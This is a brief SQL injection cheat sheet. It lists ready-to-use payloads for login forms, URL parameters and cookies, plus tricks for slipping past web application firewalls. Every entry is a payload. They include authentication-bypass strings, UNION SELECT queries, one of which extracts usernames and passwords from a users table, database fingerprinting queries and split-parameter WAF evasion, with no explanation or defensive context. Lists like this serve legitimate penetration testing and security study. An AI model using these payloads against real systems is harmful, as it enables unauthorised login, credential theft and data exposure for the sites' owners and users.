# SQLI

## Login

`'`

`' OR '1'='1`

`' OR 1=1--`

`" OR "1"="1`

`1" OR "1"="1`

`1' || '1'='1`

`") or ("1")=("1 --`

`('a'='a and hi")or ("a"="a` 

## URL

`?id=1`

`?id=1'`

`?id=1--`

`?id=1' UNION SELECT 1,2,3,4--+`

`?id=1' UNION SELECT username, password FROM users--`

## Cookies 

`' union SELECT version(),user(),database()#`

## WAFs

`?id=1&id=0' +union+select+1,@@version,database()--+`

`?id=1&param=UNI&param2=ON SEL&param3=ECT 1,2,3--`
